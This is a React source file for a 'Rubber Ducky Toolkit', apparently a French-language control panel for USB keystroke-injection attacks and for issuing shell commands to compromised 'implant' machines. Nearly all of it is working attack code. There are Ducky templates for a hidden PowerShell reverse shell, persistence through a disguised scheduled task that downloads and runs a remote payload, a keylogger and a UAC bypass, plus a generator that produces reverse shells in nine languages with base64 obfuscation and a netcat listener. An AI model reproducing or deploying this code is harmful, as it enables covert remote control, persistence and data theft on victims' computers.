import React, { useState, useEffect } from 'react';
import axios from 'axios';

function App() {
    const [payloads, setPayloads] = useState([]);
    const [implants, setImplants] = useState([
        { id: 'IMP-001', ip: '192.168.1.105', hostname: 'DESKTOP-USER', os: 'Windows 10', status: 'online', last_seen: '2 min' },
        { id: 'IMP-002', ip: '192.168.1.108', hostname: 'LAPTOP-ADMIN', os: 'Windows 11', status: 'online', last_seen: '5 min' },
        { id: 'IMP-003', ip: '192.168.1.110', hostname: 'WORKSTATION', os: 'Windows 10', status: 'offline', last_seen: '2h' }
    ]);
    const [editor, setEditor] = useState('');
    const [selectedImplant, setSelectedImplant] = useState(null);
    const [shellOutput, setShellOutput] = useState('');
    const [activeTab, setActiveTab] = useState('editor');
    
    // Reverse Shell Generator State
    const [revShellType, setRevShellType] = useState('powershell');
    const [revShellIP, setRevShellIP] = useState('');
    const [revShellPort, setRevShellPort] = useState('4444');
    const [revShellEncoding, setRevShellEncoding] = useState('none');
    const [generatedShell, setGeneratedShell] = useState('');

    // Templates Rubber Ducky puissants
    const templates = {
        reverse_shell: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"\nENTER`,
        
        privilege_escalation: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell "Start-Process cmd -Verb RunAs -ArgumentList '/c whoami /priv'"\nENTER`,
        
        persistence: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -c "schtasks /create /tn 'WindowsUpdate' /tr 'powershell -c IEX (New-Object Net.WebClient).DownloadString(\\"http://YOUR_IP/payload.ps1\\")' /sc onlogon /rl highest /f"\nENTER`,
        
        keylogger: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -c "$path='$env:temp\\\\keys.txt';while($true){$keys=Get-Process|Select-Object -ExpandProperty MainWindowTitle;Add-Content $path $keys;Start-Sleep -Seconds 5}"\nENTER`,
        
        enum_system: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -c "whoami; hostname; [Environment]::OSVersion; Get-WmiObject Win32_ComputerSystem | Select UserName; Get-WmiObject Win32_LogicalDisk | Select Name, @{Name='Size(GB)';Expression={[math]::Round($_.Size/1GB)}}"\nENTER`,
        
        uac_bypass: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -nop -w hidden -c "function Bypass-UAC { If ([System.Diagnostics.Process]::GetCurrentProcess().ProcessName -eq 'powershell') { $NewProcess = New-Object System.Diagnostics.ProcessStartInfo 'powershell' } } Bypass-UAC"\nENTER`
    };

    // Reverse Shell Generator
    const reverseShellTemplates = {
        powershell: {
            name: 'PowerShell',
            platform: 'Windows',
            generate: function(ip, port) {
                return '$client = New-Object System.Net.Sockets.TCPClient(\'' + ip + '\',' + port + ');\n$stream = $client.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n    $sendback = (iex $data 2>&1 | Out-String );\n    $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n    $stream.Write($sendbyte,0,$sendbyte.Length);\n    $stream.Flush();\n}\n$client.Close();';
            }
        },
        bash: {
            name: 'Bash',
            platform: 'Linux/Mac',
            generate: function(ip, port) {
                return 'bash -i >& /dev/tcp/' + ip + '/' + port + ' 0>&1';
            }
        },
        python: {
            name: 'Python',
            platform: 'Cross-platform',
            generate: function(ip, port) {
                return 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ip + '",' + port + '));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);';
            }
        },
        php: {
            name: 'PHP',
            platform: 'Web Server',
            generate: function(ip, port) {
                return '<?php $sock=fsockopen("' + ip + '",' + port + ');exec("/bin/sh -i <&3 >&3 2>&3"); ?>';
            }
        },
        netcat: {
            name: 'Netcat',
            platform: 'Linux',
            generate: function(ip, port) {
                return 'nc -e /bin/sh ' + ip + ' ' + port;
            }
        },
        ruby: {
            name: 'Ruby',
            platform: 'Cross-platform',
            generate: function(ip, port) {
                return 'ruby -rsocket -e\'f=TCPSocket.open("' + ip + '",' + port + ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'';
            }
        },
        perl: {
            name: 'Perl',
            platform: 'Cross-platform',
            generate: function(ip, port) {
                return 'perl -e \'use Socket;$i="' + ip + '";$p=' + port + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'';
            }
        },
        java: {
            name: 'Java',
            platform: 'Cross-platform',
            generate: function(ip, port) {
                return 'public class Shell {\n    public static void main(String[] args) {\n        try {\n            Process p = new ProcessBuilder("/bin/sh","-i").redirectErrorStream(true).start();\n            Socket s = new Socket("' + ip + '",' + port + ');\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while(!s.isClosed()) {\n                while(pi.available()>0) so.write(pi.read());\n                while(pe.available()>0) so.write(pe.read());\n                while(si.available()>0) po.write(si.read());\n                so.flush(); po.flush();\n                Thread.sleep(50);\n                try { p.exitValue(); break; } catch (Exception e){}\n            }\n            p.destroy(); s.close();\n        } catch (Exception e){}\n    }\n}';
            }
        },
        nodejs: {
            name: 'Node.js',
            platform: 'Cross-platform',
            generate: function(ip, port) {
                return '(function(){\n    var net = require("net"),\n        cp = require("child_process"),\n        sh = cp.spawn("/bin/sh", []);\n    var client = new net.Socket();\n    client.connect(' + port + ', "' + ip + '", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/;\n})();';
            }
        }
    };

    const generateReverseShell = () => {
        if (!revShellIP || !revShellPort) {
            alert('⚠️ Veuillez entrer IP et Port');
            return;
        }
        
        const template = reverseShellTemplates[revShellType];
        let shell = template.generate(revShellIP, revShellPort);
        
        // Apply encoding
        if (revShellEncoding === 'base64' && revShellType === 'powershell') {
            const encoded = btoa(unescape(encodeURIComponent(shell)));
            shell = 'powershell -enc ' + encoded;
        } else if (revShellEncoding === 'base64' && revShellType === 'bash') {
            const encoded = btoa(shell);
            shell = 'echo ' + encoded + ' | base64 -d | bash';
        } else if (revShellEncoding === 'url') {
            shell = encodeURIComponent(shell);
        }
        
        setGeneratedShell(shell);
    };

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        alert('✅ Copié dans le presse-papier !');
    };

    const compilePayload = async () => {
        try {
            const response = await axios.post('http://localhost:3001/compile', {
                name: 'payload_' + Date.now(),
                payload: editor
            });
            alert('✅ Payload compilé avec succès !');
            setPayloads([...payloads, { name: response.data.path, date: new Date().toLocaleString() }]);
        } catch (e) {
            alert('❌ Erreur compilation: ' + e.message);
        }
    };

    const executeShell = async (command) => {
        if (!selectedImplant) {
            alert('Sélectionnez un implant !');
            return;
        }
        try {
            const response = await axios.post('http://localhost:3001/shell/' + selectedImplant.id + '/execute', {
                command: command
            });
            setShellOutput(prev => prev + '\n$ ' + command + '\n' + response.data.payload);
        } catch (e) {
            setShellOutput(prev => prev + '\n❌ Erreur: ' + e.message);
        }
    };

    return (
        <div className="min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-gray-850 text-white">
            {/* Header */}
            <div className="bg-black/50 border-b border-red-600/30 p-6 sticky top-0 z-50">
                <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                        <span className="text-4xl">🐥</span>
                        <h1 className="text-3xl font-bold">Rubber Ducky Toolkit</h1>
                        <span className="ml-4 px-3 py-1 bg-red-600/20 border border-red-600 rounded-full text-red-400 text-sm">v1.0</span>
                    </div>
                    <div className="text-sm text-gray-400">
                        🟢 {implants.filter(i => i.status === 'online').length} implants actifs
                    </div>
                </div>
            </div>

            {/* Main Content */}
            <div className="p-6">
                <div className="grid grid-cols-3 gap-6">
                    {/* Implants Panel */}
                    <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-4 max-h-screen overflow-y-auto">
                        <h2 className="text-xl font-bold mb-4 border-b border-red-600/30 pb-2">📱 Machines Touchées</h2>
                        <div className="space-y-3">
                            {implants.map(imp => (
                                <div
                                    key={imp.id}
                                    onClick={() => setSelectedImplant(imp)}
                                    className={'p-4 rounded-lg border cursor-pointer transition ' + (
                                        selectedImplant?.id === imp.id
                                            ? 'bg-red-900/30 border-red-600 shadow-lg shadow-red-600/20'
                                            : 'bg-gray-800/30 border-gray-700 hover:border-red-600/50'
                                    )}
                                >
                                    <div className="flex items-center justify-between mb-2">
                                        <span className="font-mono text-sm font-bold">{imp.id}</span>
                                        <span className={'px-2 py-1 rounded text-xs font-bold ' + (
                                            imp.status === 'online' 
                                                ? 'bg-green-900 text-green-300' 
                                                : 'bg-red-900 text-red-300'
                                        )}>
                                            {imp.status === 'online' ? '🟢 Online' : '🔴 Offline'}
                                        </span>
                                    </div>
                                    <div className="space-y-1 text-xs text-gray-300">
                                        <div><span className="text-gray-400">IP:</span> {imp.ip}</div>
                                        <div><span className="text-gray-400">Host:</span> {imp.hostname}</div>
                                        <div><span className="text-gray-400">OS:</span> {imp.os}</div>
                                        <div><span className="text-gray-400">Vu:</span> {imp.last_seen}</div>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* Main Panel */}
                    <div className="col-span-2 space-y-6">
                        {/* Tabs */}
                        <div className="flex gap-2 border-b border-gray-800">
                            <button
                                onClick={() => setActiveTab('editor')}
                                className={'px-4 py-2 font-bold transition ' + (
                                    activeTab === 'editor'
                                        ? 'border-b-2 border-red-600 text-red-400'
                                        : 'text-gray-400 hover:text-white'
                                )}
                            >
                                📝 Payload Editor
                            </button>
                            <button
                                onClick={() => setActiveTab('shell')}
                                className={'px-4 py-2 font-bold transition ' + (
                                    activeTab === 'shell'
                                        ? 'border-b-2 border-red-600 text-red-400'
                                        : 'text-gray-400 hover:text-white'
                                )}
                            >
                                💻 Shell Distant
                            </button>
                            <button
                                onClick={() => setActiveTab('payloadstudio')}
                                className={'px-4 py-2 font-bold transition ' + (
                                    activeTab === 'payloadstudio'
                                        ? 'border-b-2 border-red-600 text-red-400'
                                        : 'text-gray-400 hover:text-white'
                                )}
                            >
                                🎨 PayloadStudio
                            </button>
                        </div>

                        {/* Payload Editor Tab */}
                        {activeTab === 'editor' && (
                            <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6">
                                <h3 className="text-lg font-bold mb-4">Templates Disponibles</h3>
                                <div className="grid grid-cols-2 gap-2 mb-4">
                                    {Object.keys(templates).map(key => (
                                        <button
                                            key={key}
                                            onClick={() => setEditor(templates[key])}
                                            className="px-3 py-2 bg-gray-800 hover:bg-red-600/20 border border-gray-700 hover:border-red-600 rounded text-sm text-left transition"
                                        >
                                            {key.replace(/_/g, ' ').toUpperCase()}
                                        </button>
                                    ))}
                                </div>
                                <textarea
                                    value={editor}
                                    onChange={(e) => setEditor(e.target.value)}
                                    className="w-full h-64 p-4 bg-gray-950 border border-gray-700 rounded font-mono text-sm text-gray-200 focus:border-red-600 focus:outline-none"
                                    placeholder="Entrez votre code Ducky ici..."
                                />
                                <button 
                                    onClick={compilePayload}
                                    className="w-full bg-gradient-to-r from-red-600 to-red-700 px-6 py-3 rounded mt-4 hover:from-red-500 hover:to-red-600 font-bold transition shadow-lg shadow-red-600/20"
                                >
                                    🔴 Compiler Payload USB
                                </button>
                                <div className="mt-4">
                                    <h4 className="font-bold mb-2">Payloads Compilés</h4>
                                    {payloads.length === 0 ? (
                                        <p className="text-gray-500 text-sm">Aucun payload compilé</p>
                                    ) : (
                                        <div className="space-y-2">
                                            {payloads.map((p, i) => (
                                                <div key={i} className="p-2 bg-gray-800 rounded text-sm">
                                                    <div className="text-green-400">✓ {p.name}</div>
                                                    <div className="text-gray-500 text-xs">{p.date}</div>
                                                </div>
                                            ))}
                                        </div>
                                    )}
                                </div>
                            </div>
                        )}

                        {/* Shell Distant Tab */}
                        {activeTab === 'shell' && (
                            <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6">
                                <h3 className="text-lg font-bold mb-4">
                                    {selectedImplant ? '🔗 Shell: ' + selectedImplant.hostname : '⚠️ Sélectionnez un implant'}
                                </h3>
                                <div className="mb-4 flex gap-2">
                                    <button 
                                        onClick={() => executeShell('whoami')}
                                        className="px-3 py-2 bg-gray-800 hover:bg-red-600/30 border border-gray-700 rounded text-sm transition"
                                    >
                                        whoami
                                    </button>
                                    <button 
                                        onClick={() => executeShell('ipconfig')}
                                        className="px-3 py-2 bg-gray-800 hover:bg-red-600/30 border border-gray-700 rounded text-sm transition"
                                    >
                                        ipconfig
                                    </button>
                                    <button 
                                        onClick={() => executeShell('Get-Process')}
                                        className="px-3 py-2 bg-gray-800 hover:bg-red-600/30 border border-gray-700 rounded text-sm transition"
                                    >
                                        Get-Process
                                    </button>
                                    <input 
                                        type="text" 
                                        id="customCmd"
                                        placeholder="Commande personnalisée..."
                                        className="flex-1 px-3 py-2 bg-gray-950 border border-gray-700 rounded text-sm focus:border-red-600 focus:outline-none"
                                        onKeyPress={(e) => {
                                            if (e.key === 'Enter') {
                                                executeShell(e.target.value);
                                                e.target.value = '';
                                            }
                                        }}
                                    />
                                </div>
                                <div className="bg-black/80 border border-gray-700 rounded p-4 font-mono text-xs h-64 overflow-y-auto">
                                    {shellOutput ? (
                                        <pre className="text-green-400">{shellOutput}</pre>
                                    ) : (
                                        <p className="text-gray-600">Exécutez une commande pour voir le résultat...</p>
                                    )}
                                </div>
                            </div>
                        )}

                        {/* PayloadStudio Tab - Reverse Shell Generator */}
                        {activeTab === 'payloadstudio' && (
                            <div className="space-y-6">
                                <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6">
                                    <div className="flex items-center gap-2 mb-4">
                                        <h3 className="text-xl font-bold">🔄 Reverse Shell Generator</h3>
                                        <span className="text-xs bg-blue-600/20 border border-blue-600 px-2 py-1 rounded">Online</span>
                                    </div>
                                    
                                    <div className="grid grid-cols-2 gap-4 mb-4">
                                        <div>
                                            <label className="block text-sm font-bold mb-2">Type de Shell</label>
                                            <select 
                                                value={revShellType}
                                                onChange={(e) => setRevShellType(e.target.value)}
                                                className="w-full px-3 py-2 bg-gray-950 border border-gray-700 rounded text-sm focus:border-red-600 focus:outline-none"
                                            >
                                                {Object.entries(reverseShellTemplates).map(([key, value]) => (
                                                    <option key={key} value={key}>
                                                        {value.name} ({value.platform})
                                                    </option>
                                                ))}
                                            </select>
                                        </div>

                                        <div>
                                            <label className="block text-sm font-bold mb-2">Encodage</label>
                                            <select 
                                                value={revShellEncoding}
                                                onChange={(e) => setRevShellEncoding(e.target.value)}
                                                className="w-full px-3 py-2 bg-gray-950 border border-gray-700 rounded text-sm focus:border-red-600 focus:outline-none"
                                            >
                                                <option value="none">Aucun</option>
                                                <option value="base64">Base64</option>
                                                <option value="url">URL Encode</option>
                                            </select>
                                        </div>

                                        <div>
                                            <label className="block text-sm font-bold mb-2">🌐 Votre IP (LHOST)</label>
                                            <input 
                                                type="text" 
                                                value={revShellIP}
                                                onChange={(e) => setRevShellIP(e.target.value)}
                                                placeholder="192.168.1.x" 
                                                className="w-full px-3 py-2 bg-gray-950 border border-gray-700 rounded text-sm focus:border-red-600 focus:outline-none" 
                                            />
                                        </div>

                                        <div>
                                            <label className="block text-sm font-bold mb-2">🔌 Port (LPORT)</label>
                                            <input 
                                                type="text" 
                                                value={revShellPort}
                                                onChange={(e) => setRevShellPort(e.target.value)}
                                                placeholder="4444" 
                                                className="w-full px-3 py-2 bg-gray-950 border border-gray-700 rounded text-sm focus:border-red-600 focus:outline-none" 
                                            />
                                        </div>
                                    </div>

                                    <button 
                                        onClick={generateReverseShell}
                                        className="w-full bg-gradient-to-r from-blue-600 to-blue-700 px-6 py-3 rounded font-bold hover:from-blue-500 hover:to-blue-600 transition shadow-lg"
                                    >
                                        ⚡ Générer Reverse Shell
                                    </button>
                                </div>

                                {generatedShell && (
                                    <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6">
                                        <div className="flex justify-between items-center mb-4">
                                            <h4 className="font-bold text-green-400">✅ Shell Généré</h4>
                                            <button 
                                                onClick={() => copyToClipboard(generatedShell)}
                                                className="px-4 py-2 bg-gray-800 hover:bg-green-600/30 border border-gray-700 hover:border-green-600 rounded text-sm transition"
                                            >
                                                📋 Copier
                                            </button>
                                        </div>
                                        <pre className="bg-black/80 border border-gray-700 rounded p-4 font-mono text-xs text-green-400 overflow-x-auto">{generatedShell}</pre>
                                        
                                        <div className="mt-4 p-4 bg-blue-900/20 border border-blue-600/30 rounded">
                                            <h5 className="font-bold text-blue-400 mb-2">🎧 Commande Listener</h5>
                                            <div className="flex gap-2">
                                                <pre className="flex-1 bg-black/50 p-2 rounded text-xs font-mono text-blue-300">nc -lvnp {revShellPort}</pre>
                                                <button 
                                                    onClick={() => copyToClipboard('nc -lvnp ' + revShellPort)}
                                                    className="px-3 py-1 bg-blue-600/30 hover:bg-blue-600/50 border border-blue-600 rounded text-xs transition"
                                                >
                                                    📋
                                                </button>
                                            </div>
                                            <p className="text-xs text-gray-400 mt-2">
                                                💡 Lancez cette commande sur votre machine d'attaque pour recevoir la connexion
                                            </p>
                                        </div>

                                        <div className="mt-4 grid grid-cols-2 gap-2">
                                            <button 
                                                onClick={() => setEditor(generatedShell)}
                                                className="px-4 py-2 bg-purple-600/30 hover:bg-purple-600/50 border border-purple-600 rounded text-sm transition"
                                            >
                                                📝 Envoyer vers Editor
                                            </button>
                                            <button 
                                                className="px-4 py-2 bg-orange-600/30 hover:bg-orange-600/50 border border-orange-600 rounded text-sm transition"
                                            >
                                                💾 Sauvegarder
                                            </button>
                                        </div>
                                    </div>
                                )}

                                <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6">
                                    <h4 className="font-bold mb-3">⚡ Templates Rapides</h4>
                                    <div className="grid grid-cols-3 gap-2">
                                        {Object.entries(reverseShellTemplates).map(([key, value]) => (
                                            <button
                                                key={key}
                                                onClick={() => {
                                                    setRevShellType(key);
                                                    setTimeout(() => generateReverseShell(), 100);
                                                }}
                                                className="px-3 py-2 bg-gray-800 hover:bg-blue-600/30 border border-gray-700 hover:border-blue-600 rounded text-xs transition"
                                            >
                                                {value.name}
                                            </button>
                                        ))}
                                    </div>
                                </div>
                            </div>
                        )}
                    </div>
                </div>
            </div>
        </div>
    );
}

export default App;
